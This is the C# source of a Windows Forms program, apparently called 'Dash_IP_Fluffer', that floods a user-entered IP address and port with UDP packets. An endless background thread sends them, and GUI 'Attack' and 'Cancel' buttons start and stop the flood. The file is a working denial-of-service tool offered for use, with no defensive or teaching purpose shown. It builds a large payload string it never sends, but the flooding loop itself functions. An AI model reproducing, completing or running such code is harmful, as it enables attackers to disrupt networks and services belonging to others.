using System;
using System.Net;
using System.Text;
using System.Drawing;
using System.Net.Http;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

namespace Dash_IP_Fluffer
{
    public static class Modules
    {
	public static class Attack
	{
	    private static readonly List<Thread> threads = new List<Thread>();
	    private static readonly List<Socket> sockets = new List<Socket>();

	    public static void Launch()
	    {
		string[] arr = Primary.ipbox.Text.Split(':');

		IPAddress tango = IPAddress.Parse(arr[0]);
		Int32 port = int.Parse(arr[1]);

		threads.Add
		(
		    new Thread
		    (
			() =>
			{
			    string bytes = "dashness";

			    for (int b = 0; b < bytes.Length * 40000; b += 1)
			    {
				bytes += ("dashness");
			    };

			    while (true)
			    {
				using (Socket socks = new Socket(SocketType.Dgram, ProtocolType.Udp))
				{
				    socks.Connect(tango, port);
				    socks.Send(Encoding.ASCII.GetBytes("Dashness"));

				    sockets.Add(socks);
				};
			    };
			}
		    )

		    { IsBackground = true }
		);

		threads[0].Start();
	    }

	    public static void Cancel()
	    {
		foreach (Thread thread in threads)
		{
		    thread.Abort();
		};

		foreach (Socket socket in sockets)
		{
		    socket.Dispose();
		};

		sockets.Clear();
		threads.Clear();
	    }
	};
    };

    public class Secondary
    {
	private readonly PictureBox optional_button_container = new PictureBox();
	private readonly Button settings = new Button(), attack = new Button(), tools = new Button();

	readonly Form owner = (Form) Interfuce.interfuce;

	public void Initialize()
	{
	    Add.RuImage(owner, optional_button_container, null, new Size(320, 28), new Point(-1, 82));

	    optional_button_container.BackColor = (Color) owner.BackColor;

	    try
	    {
		List<Button> buttons = new List<Button>()
		{
		    settings, attack, tools
		};

		List<string> labels = new List<string>()
		{
		    "Settings", "Attack", "Tools"
		};

		Color button_fore_color = (Color) Color.FromArgb(255, 255, 255);
		Color button_back_color = Color.FromArgb(191, 115, 153); //(Color) Get.menu_bar.BackColor;

		for (int x = 0, key = 0; key < buttons.Count; x += 110, key += 1)
		{
		    Add.AButton(optional_button_container, (Button)buttons[key], new Size(100, 28), new Point(x, 0), button_back_color, button_fore_color, labels[key], Get.FONT_TYPE_MAIN, 10);
		    Add.ControlBorder(buttons[key], 8);
		};

		attack.Click += (s, e) =>
		{
		    if (attack.Text.Equals("Attack"))
		    {
			MonitorLog.logtext.AppendText("Starting .....\r\n");
			Modules.Attack.Launch();
			MonitorLog.logtext.AppendText("Attacking!\r\n");

			attack.Text = ("Cancel");
		    }

		    else if (!attack.Text.Equals("Loading"))
		    {
			attack.Text = ("Loading");

			MonitorLog.logtext.AppendText("Stopping .....\r\n");
			Modules.Attack.Cancel();
			MonitorLog.logtext.AppendText("Waiting ....");

			attack.Text = ("Attack");
		    };
		};
	    }

	    catch (Exception e)
	    {
		Interfuce.ErrorHandler(e);
	    };
	}
    };
};
